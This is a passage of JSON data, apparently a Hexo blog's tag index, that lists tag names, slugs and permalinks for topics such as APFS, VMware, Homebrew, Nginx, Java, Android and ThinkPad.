manager","slug":"package-manager","permalink":"https://blog.chaosjohn.com/tags/package-manager/"},{"name":"APFS","slug":"APFS","permalink":"https://blog.chaosjohn.com/tags/APFS/"},{"name":"Virtualization","slug":"Virtualization","permalink":"https://blog.chaosjohn.com/tags/Virtualization/"},{"name":"IPv6","slug":"IPv6","permalink":"https://blog.chaosjohn.com/tags/IPv6/"},{"name":"VMware","slug":"VMware","permalink":"https://blog.chaosjohn.com/tags/VMware/"},{"name":"iCloud","slug":"iCloud","permalink":"https://blog.chaosjohn.com/tags/iCloud/"},{"name":"Software","slug":"Software","permalink":"https://blog.chaosjohn.com/tags/Software/"},{"name":"Homebrew","slug":"Homebrew","permalink":"https://blog.chaosjohn.com/tags/Homebrew/"},{"name":"Skills","slug":"Skills","permalink":"https://blog.chaosjohn.com/tags/Skills/"},{"name":"hexo","slug":"hexo","permalink":"https://blog.chaosjohn.com/tags/hexo/"},{"name":"Nginx","slug":"Nginx","permalink":"https://blog.chaosjohn.com/tags/Nginx/"},{"name":"Crack","slug":"Crack","permalink":"https://blog.chaosjohn.com/tags/Crack/"},{"name":"Java","slug":"Java","permalink":"https://blog.chaosjohn.com/tags/Java/"},{"name":"Gradle","slug":"Gradle","permalink":"https://blog.chaosjohn.com/tags/Gradle/"},{"name":"Error","slug":"Error","permalink":"https://blog.chaosjohn.com/tags/Error/"},{"name":"Dev","slug":"Dev","permalink":"https://blog.chaosjohn.com/tags/Dev/"},{"name":"Utility","slug":"Utility","permalink":"https://blog.chaosjohn.com/tags/Utility/"},{"name":"Android","slug":"Android","permalink":"https://blog.chaosjohn.com/tags/Android/"},{"name":"Developer","slug":"Developer","permalink":"https://blog.chaosjohn.com/tags/Developer/"},{"name":"Toy","slug":"Toy","permalink":"https://blog.chaosjohn.com/tags/Toy/"},{"name":"Hardware","slug":"Hardware","permalink":"https://blog.chaosjohn.com/tags/Hardware/"},{"name":"ThinkPad","slug":"ThinkPad","permalink":"https://blog.chaosjohn.com/tags/ThinkPad/"},{"name":"TrackPoint","slug":"TrackPoint","permalink":"https://blog.chaosjohn.com/tags/TrackPoint/"}]}